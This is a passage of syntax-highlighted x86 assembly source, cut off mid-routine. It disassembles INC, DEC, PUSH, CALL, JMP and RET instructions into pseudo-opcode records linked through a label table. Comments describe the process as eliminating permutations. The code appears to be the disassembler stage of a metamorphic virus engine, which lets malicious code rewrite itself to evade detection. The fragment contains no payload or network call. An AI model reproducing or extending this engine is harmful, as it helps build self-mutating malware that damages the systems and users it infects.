                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; INC?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@INCMem8</span><span class="sc0">       </span><span class="sc1">; Then, jump</span><span class="sc0">
    </span><span class="sc5">@@DECMem8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc0">     </span><span class="sc1">; ACh = Opcode of SUB Mem8,Imm8</span><span class="sc0">
      </span><span class="sc5">@@INCDECMem8_Next</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the type of operand</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">     </span><span class="sc1">; If we use a register operand, jump</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@INCDECReg8</span><span class="sc0">
      </span><span class="sc5">@@INCDECPUSH_Gen</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">      </span><span class="sc1">; Here if we use INC/DEC/PUSH Mem</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Decode the memory operand</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecodeMemoryConstruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; We insert a 1 as a Imm even if it's </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; PUSH, JMP or CALL, since we will</span><span class="sc0">
                                      </span><span class="sc1">; ignore this field for them</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">     </span><span class="sc1">; Did we decode JMP DWORD PTR [xxx]?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">  </span><span class="sc1">; Then, get a new EIP (treat it as</span><span class="sc0">
                                         </span><span class="sc1">; a RET)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Increase the storadge EIP and get a</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GetEIPFromFutureLabelList</span><span class="sc0"> </span><span class="sc1">; new disassembly EIP (ESI)</span><span class="sc0">
    </span><span class="sc5">@@INCDECReg8</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; Convert it to OP Reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set it in the instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Set "1" value for addition and</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; subtraction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">
    </span><span class="sc5">@@INCMem8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">      </span><span class="sc1">; Set ADD Mem8,Imm8</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@INCDECMem8_Next</span><span class="sc0">

</span><span class="sc1">;; Opcode FF: INC Mem, DEC Mem, CALL Mem, JMP Mem and PUSH Mem (32 bits)</span><span class="sc0">

    </span><span class="sc5">@@INCDECPUSHMem32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the operand type</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; INC?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@INCMem32</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">      </span><span class="sc1">; DEC?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DECMem32</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; CALL?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CALLMem32</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; JMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@JMPMem32</span><span class="sc0">
       </span><span class="sc5">@@PUSHMem32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Decode PUSH. Look if it uses a reg.</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">     </span><span class="sc1">; or a memory address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@PUSHMem32_Reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">      </span><span class="sc1">; EAX = 51h, pseudoopcode of PUSH Mem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@INCDECPUSH_Gen</span><span class="sc0">
       </span><span class="sc5">@@PUSHMem32_Reg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">      </span><span class="sc1">; 50h = Opcode of PUSH Reg</span><span class="sc0">
       </span><span class="sc5">@@INCDECPUSH_GenMem32_Reg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the operand register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Set "1" as immediate value (for INCs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; and DECs, and ignored for the others)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the opcopde</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDh</span><span class="sc0">     </span><span class="sc1">; Did we decode JMP Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; If so, treat it as a RET</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GetEIPFromFutureLabelList</span><span class="sc0">

       </span><span class="sc1">;; Here if we decoded INC</span><span class="sc0">
       </span><span class="sc5">@@INCMem32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">     </span><span class="sc1">; Check if it uses a register or a</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">     </span><span class="sc1">; memory address as operand</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@INCReg32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; If Mem, set ADD Mem,Imm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@INCDECMem8_Next</span><span class="sc0">
       </span><span class="sc5">@@INCReg32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; If Reg, set ADD Reg,Imm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@INCDECPUSH_GenMem32_Reg</span><span class="sc0">

       </span><span class="sc1">;; Here if we decoded DEC</span><span class="sc0">
       </span><span class="sc5">@@DECMem32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get if it uses a memory address or</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">     </span><span class="sc1">; a register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DECReg32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">      </span><span class="sc1">; Set SUB Mem,Imm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@INCDECMem8_Next</span><span class="sc0">
       </span><span class="sc5">@@DECReg32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">      </span><span class="sc1">; Set SUB Reg,Imm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@INCDECPUSH_GenMem32_Reg</span><span class="sc0">

       </span><span class="sc1">;; Here if we decoded CALL Mem (or CALL Reg)</span><span class="sc0">
       </span><span class="sc5">@@CALLMem32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">     </span><span class="sc1">; Get the type of operand</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CALLMem32_Reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">     </span><span class="sc1">; Set CALL Mem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@INCDECPUSH_Gen</span><span class="sc0">
       </span><span class="sc5">@@CALLMem32_Reg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc0">     </span><span class="sc1">; Normally APIs</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@INCDECPUSH_GenMem32_Reg</span><span class="sc0">
       </span><span class="sc5">@@JMPMem32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@JMPMem32_Reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">    </span><span class="sc1">; Normally to simulate RET, so treat it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; as a RET (after decoding)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@INCDECPUSH_Gen</span><span class="sc0">
       </span><span class="sc5">@@JMPMem32_Reg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDh</span><span class="sc0">    </span><span class="sc1">; Treat it also as a RET (coz it's a jump</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@INCDECPUSH_GenMem32_Reg</span><span class="sc0"> </span><span class="sc1">; with undefined destiny)</span><span class="sc0">

     </span><span class="sc5">@@NextInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">; Increase storadge EIP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ContinueDissasembly</span><span class="sc0">

</span><span class="sc1">;;;; RET disassembly</span><span class="sc0">

     </span><span class="sc5">@@RET</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">   </span><span class="sc1">; Insert the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">    </span><span class="sc1">; Increase the storing EIP and get a new</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GetEIPFromFutureLabelList</span><span class="sc0"> </span><span class="sc1">; EIP for ESI. If there</span><span class="sc0">
                                                  </span><span class="sc1">; aren't more, finish.</span><span class="sc0">

</span><span class="sc1">;;;; JMP SHORT</span><span class="sc0">

     </span><span class="sc5">@@JMP8</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the displacement</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@JMP8_01</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
          </span><span class="sc5">@@JMP8_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Add the length of the instruction to</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">; the read EIP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@JMP_Next01</span><span class="sc0">

</span><span class="sc1">;;;; JMP LONG</span><span class="sc0">
     </span><span class="sc5">@@JMP</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the displacement</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;; The jump is stored as 0E9h,dd IndexOnLabelTable. By this way, if we change</span><span class="sc0">
</span><span class="sc1">;; the offset of the label, we only have to update the address at the table,</span><span class="sc0">
</span><span class="sc1">;; and all the references are automatically updated.</span><span class="sc0">
     </span><span class="sc5">@@JMP_Next01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoInstructions</span><span class="sc0">
           </span><span class="sc5">@@FindDestinyInTable</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Check with the pointer to the real</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SetLabel</span><span class="sc0">        </span><span class="sc1">; instruction, and set label if we</span><span class="sc0">
                                        </span><span class="sc1">; found it.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@FindDestinyInTable</span><span class="sc0">
       </span><span class="sc5">@@NoInstructions</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; Set a NOP if we didn't disassembled</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; yet the instruction. So, change the</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">        </span><span class="sc1">; read EIP (at ESI) directly without</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; inserting the jump. In this way,</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopTrace</span><span class="sc0">       </span><span class="sc1">; the disassembling is automatically</span><span class="sc0">
                                        </span><span class="sc1">; eliminating the permutations.</span><span class="sc0">
       </span><span class="sc5">@@SetLabel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">       </span><span class="sc1">; Set JMP pseudoopcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; Set the new pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
